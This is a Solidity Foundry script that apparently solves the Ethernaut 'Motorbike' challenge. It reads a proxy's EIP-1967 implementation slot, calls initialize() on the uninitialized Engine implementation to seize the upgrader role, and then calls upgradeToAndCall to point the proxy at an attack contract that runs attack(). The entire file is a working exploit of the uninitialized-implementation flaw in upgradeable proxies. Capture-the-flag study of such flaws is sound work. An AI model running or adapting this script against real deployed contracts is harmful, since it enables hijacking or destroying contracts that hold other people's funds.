// SPDX-License-Identifier: MIT

pragma solidity <0.7.0;

import "forge-std/Script.sol";
import {Motorbike, Engine} from "../src/Motorbike.sol";

contract DeployMotorbikeAttack is Script {
    Motorbike motorbike = Motorbike(0x8042dc9592aE9f42CEdAD72B337D1F1dA247AD76); // Proxy contract instance

    // implementation address = 0x5e6Fca708fd78336eA9DC1d9b4fbfB4d903d8658
    // await web3.eth.getStorageAt(contract.address, '0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc')

    function run() external{
        vm.startBroadcast();

        // vm.load(contract_address, slot_no) will return a bytes32 value and the address is 20 bytes
        // address(uint160(uint256())) is used to convert bytes32 to address
        Engine engineAddress = Engine(address(uint160(uint256(vm.load(address(motorbike), 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc)))));

        engineAddress.initialize();
        console.log("Engine address is:", address(engineAddress));
        console.log("Attacker upgrader is:", engineAddress.upgrader());
        bytes memory encodedData = abi.encodeWithSignature("attack()");
        require(encodedData.length > 0, "Encoding of attack function failed");
        engineAddress.upgradeToAndCall(0xC501f0BA86e95f97dDdaF7532E6459f2567d8522, encodedData); // implementation contract upgrade with attack contract encoded data

        vm.stopBroadcast();
    }
}
